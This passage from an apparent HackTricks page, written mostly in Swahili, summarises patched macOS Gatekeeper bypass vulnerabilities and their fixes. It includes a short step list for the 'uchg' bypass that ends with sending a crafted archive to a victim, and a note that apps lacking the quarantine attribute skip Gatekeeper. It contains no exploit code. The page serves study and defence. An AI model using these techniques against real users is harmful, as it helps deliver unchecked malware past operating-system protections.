Bypass ya Gatekeeper iliyotatuliwa katika macOS Sonoma 14.0 iliwezesha apps zilizotengenezwa maalum kuendeshwa bila kuonyesha ombi la idhini. Maelezo yalifahamishwa kwa umma baada ya patch na tatizo lilitumiwa kwa uhalifu kabla ya kurekebishwa. Hakikisha Sonoma 14.0 au toleo jipya limewekwa.

### [CVE-2024-27853]

Gatekeeper bypass katika macOS 14.4 (iliyotolewa Machi 2024) ilitokana na `libarchive` kushughulikia ZIPs zenye madhara, ikiruhusu apps kuepuka assessment. Sasisha hadi 14.4 au baadaye ambapo Apple ilitatua suala hilo.

### [CVE-2024-44128](https://support.apple.com/en-us/121234)

An **Automator Quick Action workflow** iliyowekwa ndani ya app iliyopakuliwa inaweza kusababisha utekelezaji bila Gatekeeper assessment, kwa sababu workflows zilichukuliwa kama data na kuendeshwa na Automator helper nje ya njia ya kawaida ya notarization prompt. `.app` iliyotengenezwa bundling Quick Action inayotekeleza shell script (mfano, ndani ya `Contents/PlugIns/*.workflow/Contents/document.wflow`) inaweza hivyo kuendeshwa mara moja wakati wa kuanzisha. Apple iliongeza dialogo ya ziada ya ridhaa na kurekebisha njia ya assessment katika Ventura **13.7**, Sonoma **14.7**, na Sequoia **15**.

### Third‑party unarchivers mis‑propagating quarantine (2023–2024)

Taarifa kadhaa za udhaifu katika zana maarufu za extraction (mfano, The Unarchiver) zilisababisha faili zilizotolewa kutoka kwa archives kushindwa kupata xattr ya `com.apple.quarantine`, zikifungua fursa za Gatekeeper bypass. Daima tumia macOS Archive Utility au zana zilizosahihishwa (patched) unapotest, na thibitisha xattrs baada ya extraction.

### uchg (from this [talk](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf))

- Create a directory containing an app.
- Add uchg to the app.
- Compress the app to a tar.gz file.
- Send the tar.gz file to a victim.
- The victim opens the tar.gz file and runs the app.
- Gatekeeper does not check the app.

### Prevent Quarantine xattr

In an ".app" bundle if the quarantine xattr is not added to it, when executing it **Gatekeeper won't be triggered**.


## References

- Apple Platform Security: Kuhusu maudhui ya usalama ya macOS Sonoma 14.4 (inajumuisha CVE-2024-27853) – [https://support.apple.com/en-us/HT214084](https://support.apple.com/en-us/HT214084)
- Eclectic Light: Jinsi macOS sasa inafuatilia asili ya apps – [https://eclecticlight.co/2023/05/10/how-macos-now-tracks-the-provenance-of-apps/](https://eclecticlight.co/2023/05/10/how-macos-now-tracks-the-provenance-of-apps/)
- Apple: Kuhusu maudhui ya usalama ya macOS Sonoma 14.7 / Ventura 13.7 (CVE-2024-44128) – [https://support.apple.com/en-us/121234](https://support.apple.com/en-us/121234)
- MacRumors: macOS 15 Sequoia removes the Control‑click “Open” Gatekeeper bypass – [https://www.macrumors.com/2024/06/11/macos-sequoia-removes-open-anyway/](https://www.macrumors.com/2024/06/11/macos-sequoia-removes-open-anyway/)

{{#include ../../../banners/hacktricks-training.md}}
